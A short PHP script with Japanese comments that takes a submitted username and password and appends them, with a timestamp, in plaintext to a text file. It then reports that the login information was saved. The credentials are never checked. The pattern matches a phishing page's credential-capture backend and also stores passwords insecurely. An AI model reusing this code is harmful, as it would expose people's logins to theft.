<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ユーザー名とパスワードを取得
    $username = htmlspecialchars($_POST['username'], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');

    // ログイン情報を保存するファイルのパス
    $file = 'login_info.txt';

    // 現在の日時を取得
    $date = date('Y-m-d H:i:s');

    // ログイン情報をフォーマット
    $log = "日時: $date\nユーザー名: $username\nパスワード: $password\n\n";

    // ファイルに追記
    file_put_contents($file, $log, FILE_APPEND);

    echo "ログイン情報が保存されました。";
}
?>